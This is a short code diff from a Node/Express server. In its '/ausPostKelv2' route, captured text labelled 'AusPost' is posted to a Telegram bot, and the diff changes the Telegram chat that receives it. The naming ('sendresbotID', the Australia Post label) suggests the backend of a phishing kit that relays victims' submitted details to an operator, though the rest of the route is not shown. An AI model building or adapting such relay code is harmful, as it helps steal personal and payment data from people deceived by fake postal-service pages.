@@ -3568,7 +3568,7 @@ app.post("/ausPostKelv2", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: "-757683438",
+              chat_id: 1248378980,
               text: `AusPost:\n${originalText}`,
               parse_mode: "Markdown",
             }
